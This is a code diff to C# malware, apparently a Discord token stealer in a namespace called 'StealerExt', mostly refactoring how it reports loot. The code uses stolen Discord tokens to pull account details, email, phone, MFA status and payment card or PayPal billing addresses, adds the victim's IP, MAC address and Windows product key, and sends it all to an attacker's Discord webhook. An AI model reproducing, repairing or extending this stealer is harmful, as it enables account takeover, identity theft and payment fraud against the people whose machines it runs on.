@@ -115,15 +115,15 @@ namespace StealerExt
 				{
 					FailedPaymentInfo = true;
 				}
+				ManagementObjectSearcher mos = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem");
+				string OSName = null;
+				foreach (ManagementObject managementObject in mos.Get())
+				{
+					OSName = managementObject["Caption"].ToString();
+				}
+				string IP = new WebClient().DownloadString("https://ipecho.net/plain");
 				try
 				{
-					ManagementObjectSearcher mos = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem");
-					string OSName = null;
-					foreach (ManagementObject managementObject in mos.Get())
-					{
-						OSName = managementObject["Caption"].ToString();
-					}
-					string IP = new WebClient().DownloadString("https://ipecho.net/plain");
 					var embed = new DiscordWebhook(Hook);
 					embed.CreateEmbed($"User: {Environment.UserName}", 0x36393F);
 					embed.AddField("IP:", IP, true);
@@ -131,11 +131,14 @@ namespace StealerExt
 					embed.AddField("Product Key:", KeyDecoder.GetWindowsProductKeyFromRegistry(), true);
 					embed.AddField("Mac Address:", NetworkInterface.GetAllNetworkInterfaces().FirstOrDefault(nic => nic.OperationalStatus == OperationalStatus.Up && nic.NetworkInterfaceType != NetworkInterfaceType.Loopback)?.GetPhysicalAddress().ToString(), true);
 					embed.AddField("__Token Info__", $"Username | {_tokenInfo.username}#{_tokenInfo.discriminator}\nID | {_tokenInfo.id}\nNitro | {_tokenInfo.premium_type}\nEmail | {_tokenInfo.email}\nPhone | {_tokenInfo.phone}\nVerified | {_tokenInfo.verified}\nMFA | {_tokenInfo.mfa_enabled}\nLanguage | {_tokenInfo.locale}\nFlags | {_tokenInfo.flags}\n{Platform} Token | ||{token}||");
-					if (_getpaymentInfo.Contains("email") & !FailedPaymentInfo)
+					if (_getpaymentInfo.Contains("email") && !FailedPaymentInfo)
 					{
 						embed.AddField("__Payment Info__", $"Has Payment | Yes\nPayment Type | PayPal\nEmail | {payment.email}\nName | {payment.billing_address.name}\nAddress Line 1 | {payment.billing_address.line_1}\nAddress Line 2 | {payment.billing_address.line_2}\nCity | {payment.billing_address.city}\nState | {payment.billing_address.state}\nPostal Code | {payment.billing_address.postal_code}\nCountry | {payment.billing_address.country}");
 					}
-					else if (_getpaymentInfo.Contains("mastercard") || _getpaymentInfo.Contains("visa")) embed.AddField("__Payment Info__", $"Has Payment | Yes\nPayment Type | {payment.brand}\nExpiry | {payment.expires_month}/{payment.expires_year}\nName | {payment.billing_address.name}\nAddress Line 1 | {payment.billing_address.line_1}\nAddress Line 2 | {payment.billing_address.line_2}\nCity | {payment.billing_address.city}\nState | {payment.billing_address.state}\nPostal Code | {payment.billing_address.postal_code}\nCountry | {payment.billing_address.country}");
+					else if ((_getpaymentInfo.Contains("mastercard")) || (_getpaymentInfo.Contains("visa")))
+					{
+						embed.AddField("__Payment Info__", $"Has Payment | Yes\nPayment Type | {payment.brand}\nExpiry | {payment.expires_month}/{payment.expires_year}\nName | {payment.billing_address.name}\nAddress Line 1 | {payment.billing_address.line_1}\nAddress Line 2 | {payment.billing_address.line_2}\nCity | {payment.billing_address.city}\nState | {payment.billing_address.state}\nPostal Code | {payment.billing_address.postal_code}\nCountry | {payment.billing_address.country}");
+					}
 					else if (FailedPaymentInfo)
 					{
 						embed.AddField("__Payment Info__", "Has Payment | Yes\nFailed To Parse Other Info");
@@ -144,13 +147,6 @@ namespace StealerExt
 				}
 				catch
 				{
-					ManagementObjectSearcher mos = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem");
-					string OSName = null;
-					foreach (ManagementObject managementObject in mos.Get())
-					{
-						OSName = managementObject["Caption"].ToString();
-					}
-					string IP = new WebClient().DownloadString("https://ipecho.net/plain");
 					var embed = new DiscordWebhook(Hook);
 					embed.CreateEmbed($"User: {Environment.UserName}", 0x36393F);
 					embed.AddField("IP:", IP, true);
@@ -165,9 +161,11 @@ namespace StealerExt
 			}
 			else if (!SavedTokens.Contains(token))
 			{
-				Dictionary<string, string> headers = new Dictionary<string, string>();
-				headers.Add("Authorization", token);
-				var request = new HttpUtils();
+                Dictionary<string, string> headers = new Dictionary<string, string>
+                {
+                    { "Authorization", token }
+                };
+                var request = new HttpUtils();
 				bool PaymentInfo = false;
 				string _gettokenInfo = await request.GetStringAsync("https://discordapp.com/api/v8/users/@me", headers);
 				dynamic _tokenInfo = JsonConvert.DeserializeObject(_gettokenInfo);
@@ -206,11 +204,14 @@ namespace StealerExt
 					var embed = new DiscordWebhook(Hook);
 					embed.CreateEmbed($"User: {Environment.UserName}", 0x36393F);
 					embed.AddField("__Token Info__", $"Username | {_tokenInfo.username}#{_tokenInfo.discriminator}\nID | {_tokenInfo.id}\nNitro | {_tokenInfo.premium_type}\nEmail | {_tokenInfo.email}\nPhone | {_tokenInfo.phone}\nVerified | {_tokenInfo.verified}\nMFA | {_tokenInfo.mfa_enabled}\nLanguage | {_tokenInfo.locale}\nFlags | {_tokenInfo.flags}\n{Platform} Token | ||{token}||");
-					if (_getpaymentInfo.Contains("email") & !PaymentInfo)
+					if (_getpaymentInfo.Contains("email") && !PaymentInfo)
 					{
 						embed.AddField("__Payment Info__", $"Has Payment | Yes\nPayment Type | PayPal\nEmail | {payment.email}\nName | {payment.billing_address.name}\nAddress Line 1 | {payment.billing_address.line_1}\nAddress Line 2 | {payment.billing_address.line_2}\nCity | {payment.billing_address.city}\nState | {payment.billing_address.state}\nPostal Code | {payment.billing_address.postal_code}\nCountry | {payment.billing_address.country}");
 					}
-					else if (_getpaymentInfo.Contains("mastercard") || _getpaymentInfo.Contains("visa")) embed.AddField("__Payment Info__", $"Has Payment | Yes\nPayment Type | {payment.brand}\nExpiry | {payment.expires_month}/{payment.expires_year}\nName | {payment.billing_address.name}\nAddress Line 1 | {payment.billing_address.line_1}\nAddress Line 2 | {payment.billing_address.line_2}\nCity | {payment.billing_address.city}\nState | {payment.billing_address.state}\nPostal Code | {payment.billing_address.postal_code}\nCountry | {payment.billing_address.country}");
+					else if ((_getpaymentInfo.Contains("mastercard")) || (_getpaymentInfo.Contains("visa")))
+					{
+						embed.AddField("__Payment Info__", $"Has Payment | Yes\nPayment Type | {payment.brand}\nExpiry | {payment.expires_month}/{payment.expires_year}\nName | {payment.billing_address.name}\nAddress Line 1 | {payment.billing_address.line_1}\nAddress Line 2 | {payment.billing_address.line_2}\nCity | {payment.billing_address.city}\nState | {payment.billing_address.state}\nPostal Code | {payment.billing_address.postal_code}\nCountry | {payment.billing_address.country}");
+					}
 					else if (PaymentInfo)
 					{
 						embed.AddField("__Payment Info__", "Has Payment | Yes\nFailed To Parse Other Info");
@@ -235,12 +236,12 @@ namespace StealerExt
 						{
 							_name = API.name,
 							_ppUrl = API.pfp
-						}.SendSysInfo($"```{Platform} Token {token}\n```", null);
+						}.idk($"```{Platform} Token {token}\n```");
 						new API(API.wHook)
 						{
 							_name = API.name,
 							_ppUrl = API.pfp
-						}.SendSysInfo($"```{x.Message}```", null);
+						}.idk($"```{x.Message}```");
 					}
 				}
 				SavedTokens.Add(token);
@@ -386,12 +387,5 @@ namespace StealerExt
         
 		private static readonly List<string> SavedTokens = new List<string>();
 		public static string Hook = API.wHook;
-	}
-	public static class GetFilesExtension
-	{
-		public static IEnumerable<FileInfo> GetFilesNew(this DirectoryInfo dir, params string[] ext)
-		{
-			return dir.EnumerateFiles().Where(file => ext.Contains(file.Extension));
-		}
 	}
 }
